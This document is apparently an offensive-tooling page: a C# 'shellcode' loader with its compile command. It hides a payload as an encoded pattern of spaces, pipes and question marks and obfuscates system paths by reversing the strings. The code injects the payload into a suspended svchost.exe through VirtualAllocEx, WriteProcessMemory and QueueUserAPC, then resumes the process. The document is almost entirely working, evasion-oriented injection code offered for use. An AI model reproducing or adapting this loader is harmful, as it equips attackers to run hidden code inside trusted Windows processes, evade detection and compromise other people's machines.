# Shellcode
Alternative version

Compile: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /platform:x64 /target:exe /unsafe shellcode.cs

```

using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.IO;

namespace Code
{

    public class Program
    {

      public static string Reverse( string s )
      {
          char[] str = s.ToCharArray();
          Array.Reverse( str );
          return new string( str );
      }

        static void Main(string[] args)
        {

            string scode = "       |  ? |   | ?  |  |        ?  |    |-?  |   /  ? |         |  ?-?-?-?      |     ?        | ?      |     ?        |-?        |  ?        | ?        |      ?       |  ?    |         ?  | |-? |-| ?" +
                           "       |  ? |   |         ?        |  ?         |      ?       |  ? |   |         ?        |  ?  |    ?       |  ? |   |         ?        |  ?   |  ?       |  ? |   |         ? | |    ?        |-?       |  ? |     ? |        |   ?       |    ?" +
                           "       |    ?       |       ?    |         ?  |-| ?       |  ?    |         ? |         |  ? |       |  ?      |-?         |       ? |  |    ?  ?    |    ?   |  ?      |     ? |         |   ?  |-| ? |   ?      |     ? ?" +
                           " |         |   ?  |  |      ?  |   |       ?        |  ?      |     ?        | ?       |  ? |   |         ?        |  ?   |  ? |   |         ?      |      ?      |-?       |  ? ?  |-|        ? |   |         ? |  |        ? |   |      ?-?" +
                           "-?-?       |  ? |   |   ? |         |  ? | |      ? |-|   ?       |  ? ?  |-|        ?        |-? |   |         ?       |  ?  |    ?      |        ? |   |         ?      |    ?   |  ?       |   ? ?" +
                           "  |-|        ?  |  |       ?        |      ?       |  ?  |     |     ?  |-| ?      |     ? |   |         ?     |  ? |   |      ?       |  ? ?  | |    ?       |       ?    |         ?  |-| ?       |  ?    |         ? |         |  ? |       |  ?" +
                           "      |     ? |         |   ?  |-| ? |   ?      |     ? ? |         |   ?     |      ?  |  |    ? | |       ?  |    | ?       |      ?   ?       |      ?   |      ?        ?      |         ?     |       ?  |-|         ?" +
                           " | |       ?  | |      ?        |        ?      |        ? |   |         ?      |    ?   |      ?       |   ? ?  |-|        ? |-|  ?      |     ? |   |         ? |  ?       |  ?      |        ? |   |         ?      |    ?  |        ?       |   ?" +
                           " ?  |-|        ?      |     ? |   |         ?    ? |   |      ?       |  ? ?  |-|        ?      |     ?        |        ?      |     ?        |        ?         |    ?        |         ?         |-?      |     ?        |        ?      |     ?" +
                           "        |         ?      |     ?         |-?       |  ? |   | ?  |   |      ?   |  ?      |     ?        |  ?  |     |     ?  |  |    ?        |        ?      |     ?        |         ?         |-?       |  ? |   |         ? |        ?  |   |   ?        |       ?" +
                           "  |     |     ?  |     |     ?  /     |     ?         |   ?       |   ? |         |-? | |         ? | |     ?     |-?         |     ?     | ?     |-?-?-?      |     ?        |      ?       |   ? |   |       ?  |   |-?       |  ?" +
                           " |  |         ?  |   |      ? |      |-? ?-?-?       |   ? |   |       ?  |  |         ?       |   ? |        |        ?  ?-? ? |        |       ?        |       ?     |       ? |    | ?  | |     ?      |     ?" +
                           "        |    ?       |   ? |   |       ?  |  |        ?       |      ? |   |       ?  |    | ?      |     ? |        |      ?       |      ? | |         ?   |        ?       ?  |     |     ?  | |   ?       |      ? |   |       ?  |   |    ? |-|    ? ?" +
                           " ?-?-?        |         ?      |     ? |        |      ?    | ? |  |        ? |-|       ?-?  |     |     ?  | |   ?        |-?        |-?       |       ?    |         ?  |-| ?       |       ?    |         ? |         |  ?" +
                           "       |  ?  |     |     ? |         |  ?       |  ? |   |       ? |         |    ?       |  ?  |     |     ? |         |  ?       |  ? |   |       ? |         |   ?      |     ? |        |      ?  |   |    ? |     ?  |  |   ?  |  |    ?  |     |     ?  | |   ?" +
                           "       |  ? |   |       ? |         |         ? |-|      ? |      ?      |     ?        |        ?       |      ? |   |       ?  |  |      ?       |  ? |   |       ?  |    |         ?      |     ? |        |      ? |     |   ? |      |     ? | |      ?         |       ?  |     |     ?" +
                           "  | |   ?       |  ? |  |         ? |         |      ?      |    ?  ?-?-?       |   ? |        |    ?         |         ? |-|         ? |-|-?-?-?-?-?-?      |     ?        |-?" +
                           "      |     ?        |-?       |  ? |   |       ?  |  |      ?        |       ?        |       ?        |       ?       |       ?    |         ? |         |  ? |-|      ? |   ?        |         ?      |     ?        |-?  |  |      ?  |     |  ? |-|  ? |         |         ?" +
                           "      |        ?   |      ?        |    ? ? ?       |  ? |    | ?      |        ?   |      ?  |    ? |         |        ?-? |-|    ?       |  ? |   |       ?  |   |-?        |      ?        |-?      |     ?        |-?" +
                           "      |     ?        |-?      |     ?        |-?       |   ?  |     |     ? |         |  ?      |     ?        |-?       |   ?  |     |     ?  |-|-?       |       ? |   |       ? |         |   ?       |      ? |   |       ? |         |   ?      |     ? |        |      ?" +
                           " |  | ?  /-|    ?      |   ? |   |    ?  |     |     ?  | |   ?       |  ?    |         ?  | |-?       |  ?  |     |     ?  |-|  ? |   |         ? |    ?      |     ? |        |      ?        ? |   |     ?  |         ?         |      ?" +
                           "  |     |     ?  | |   ? |        |       ?  |    |-? |        | ? |      |  ?        |      ?      |     ? |        |      ? |      |      ? |    |         ? |        |         ? |     |       ?  |     |     ?  | |   ?       |  ? |   | ? |         |      ?    |-?      |-?" +
                           "      ? |  |    ? |-? |  |        ?  |     | ?  |  |    ? | |       ?     ? |        |       ?       | ? |         ? / |    ? | | ? |-|      ?-?        |         ?      |     ? |   |       ?  | |        ?  |     |     ?  | |   ?";


            bool result;
            STARTUPINFO si = new STARTUPINFO();
            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
            result = CreateProcess(Reverse(@"exe.tsohcvs\23metsyS\swodniW\:C"), Reverse(@"detcitseRkrowteNmetsySlacoL k- exe.tsohcvs\23metsyS\swodniw\:C"), IntPtr.Zero, IntPtr.Zero, false, ProcessCreationFlags.CREATE_SUSPENDED | ProcessCreationFlags.CREATE_NO_WINDOW, IntPtr.Zero, Reverse(@"\23metsyS\swodniW\:C"), ref si, out pi); // CreateProcess
            IntPtr allocMemAddress = VirtualAllocEx(pi.hProcess, IntPtr.Zero, scode.Length + 1, MEM_COMMIT, PAGE_READWRITE); // VirtualAllocEx
            IntPtr allocMemAddressCopy;
            allocMemAddressCopy = allocMemAddress;
            IntPtr bytesWritten = IntPtr.Zero;
            uint CPR = 0;
            byte [] data = new byte [] { 000 };
            string strnum = "";
            int pos = 0;
            int num = 0;

            for (int i = 1; i <= scode.Length; i++) { if (scode.Substring(pos, 1) == " ") { num++; }
                else if (scode.Substring(pos, 1) == "|" || scode.Substring(pos,1) == "/") { if (num > 0) { strnum = strnum + num.ToString(); num = 0; } }
                else if (scode.Substring(pos, 1) == "-") { strnum = strnum + "0"; num = 0; }
                else if (scode.Substring(pos, 1) == "?") { if (scode.Substring(pos - 1, 1) == "?" || scode.Substring(pos - 1, 1) == "-")
                {
                  data[0] = Byte.Parse( strnum );
                  result = WriteProcessMemory(pi.hProcess, allocMemAddress, data, 1, out bytesWritten); // WriteProcessMemory
                  allocMemAddress = allocMemAddress + 1;
                  strnum = "";
                  num = 0;
                 }
                else {
                  data[0] = Byte.Parse( strnum + num.ToString() );
                  result = WriteProcessMemory(pi.hProcess, allocMemAddress, data, 1, out bytesWritten); // WriteProcessMemory
                  allocMemAddress = allocMemAddress + 1;
                  strnum = "";
                  num = 0;
                  } }
                pos++;
            }

            result = VirtualProtectEx(pi.hProcess, allocMemAddressCopy, scode.Length + 1, PAGE_EXECUTE_READ, out CPR); // VirtualProtectEx
            Process targetProc = Process.GetProcessById((int)pi.dwProcessId);
            ProcessThreadCollection currentThreads = targetProc.Threads;
            IntPtr openThreadPtr = OpenThread(ThreadAccess.SET_CONTEXT, false, currentThreads[0].Id); // OpenThread
            IntPtr APCPtr = QueueUserAPC(allocMemAddressCopy, openThreadPtr, IntPtr.Zero); // QueueUserAPC
            IntPtr ThreadHandler = pi.hThread;
            ResumeThread(ThreadHandler); // ResumeThread
        }

        class Win32
        {
            [DllImport("kernel32")]
            public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
            [DllImport("kernel32")]
            public static extern IntPtr LoadLibrary(string name);
            [DllImport("kernel32")]
            public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
        }

            private static UInt32 MEM_COMMIT = 0x1000;
    				private static UInt32 PAGE_READWRITE = 0x04;
    				private static UInt32 PAGE_EXECUTE_READ = 0x20;

      			[Flags]
      			public enum ProcessAccessFlags : uint
      			{
      				  All = 0x001F0FFF,
      					Terminate = 0x00000001,
      					CreateThread = 0x00000002,
      					VirtualMemoryOperation = 0x00000008,
      					VirtualMemoryRead = 0x00000010,
      					VirtualMemoryWrite = 0x00000020,
      					DuplicateHandle = 0x00000040,
      					CreateProcess = 0x000000080,
      					SetQuota = 0x00000100,
      					SetInformation = 0x00000200,
      					QueryInformation = 0x00000400,
      					QueryLimitedInformation = 0x00001000,
      					Synchronize = 0x00100000
      			}

      			[Flags]
      			public enum ProcessCreationFlags : uint
      			{
      					ZERO_FLAG = 0x00000000,
      					CREATE_BREAKAWAY_FROM_JOB = 0x01000000,
      					CREATE_DEFAULT_ERROR_MODE = 0x04000000,
      					CREATE_NEW_CONSOLE = 0x00000010,
      					CREATE_NEW_PROCESS_GROUP = 0x00000200,
      					CREATE_NO_WINDOW = 0x08000000,
      					CREATE_PROTECTED_PROCESS = 0x00040000,
      					CREATE_PRESERVE_CODE_AUTHZ_LEVEL = 0x02000000,
      					CREATE_SEPARATE_WOW_VDM = 0x00001000,
      					CREATE_SHARED_WOW_VDM = 0x00001000,
      					CREATE_SUSPENDED = 0x00000004,
      					CREATE_UNICODE_ENVIRONMENT = 0x00000400,
      					DEBUG_ONLY_THIS_PROCESS = 0x00000002,
      					DEBUG_PROCESS = 0x00000001,
      					DETACHED_PROCESS = 0x00000008,
      					EXTENDED_STARTUPINFO_PRESENT = 0x00080000,
      					INHERIT_PARENT_AFFINITY = 0x00010000
      			}

            public struct PROCESS_INFORMATION
      			{
      					public IntPtr hProcess;
      					public IntPtr hThread;
      					public uint dwProcessId;
      					public uint dwThreadId;
      			}

            public struct STARTUPINFO
      			{
      					public uint cb;
      					public string lpReserved;
      					public string lpDesktop;
      					public string lpTitle;
      					public uint dwX;
      					public uint dwY;
      					public uint dwXSize;
      					public uint dwYSize;
      					public uint dwXCountChars;
      					public uint dwYCountChars;
      					public uint dwFillAttribute;
      					public uint dwFlags;
      					public short wShowWindow;
      					public short cbReserved2;
      					public IntPtr lpReserved2;
      					public IntPtr hStdInput;
      					public IntPtr hStdOutput;
      					public IntPtr hStdError;
      			}

      			[Flags]
      			public enum ThreadAccess : int
      				{
      					TERMINATE           = (0x0001) ,
      					SUSPEND_RESUME      = (0x0002) ,
      					GET_CONTEXT         = (0x0008) ,
      					SET_CONTEXT         = (0x0010) ,
      					SET_INFORMATION     = (0x0020) ,
      					QUERY_INFORMATION   = (0x0040) ,
      					SET_THREAD_TOKEN    = (0x0080) ,
      					IMPERSONATE         = (0x0100) ,
      					DIRECT_IMPERSONATION    = (0x0200)
      			}


                    [DllImport("kernel32.dll")]
                    public static extern bool CreateProcess( string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, ProcessCreationFlags dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation );

                    [DllImport("kernel32.dll", SetLastError = true )]
                    public static extern IntPtr VirtualAllocEx( IntPtr hProcess, IntPtr lpAddress, Int32 dwSize, UInt32 flAllocationType, UInt32 flProtect );

                    [DllImport("kernel32.dll", SetLastError = true)]
                    public static extern bool WriteProcessMemory(	IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int nSize, out IntPtr lpNumberOfBytesWritten );

                    [DllImport("kernel32.dll")]
                    public static extern bool VirtualProtectEx( IntPtr hProcess, IntPtr lpAddress, int dwSize, uint flNewProtect, out uint lpflOldProtect );

                    [DllImport("kernel32.dll", SetLastError = true)]
                    public static extern IntPtr OpenThread( ThreadAccess dwDesiredAccess, bool bInheritHandle, int dwThreadId );

                    [DllImport("kernel32.dll")]
                    public static extern IntPtr QueueUserAPC( IntPtr pfnAPC, IntPtr hThread, IntPtr dwData );

                    [DllImport("kernel32.dll")]
                    public static extern uint ResumeThread( IntPtr hThread );

      }

}


```
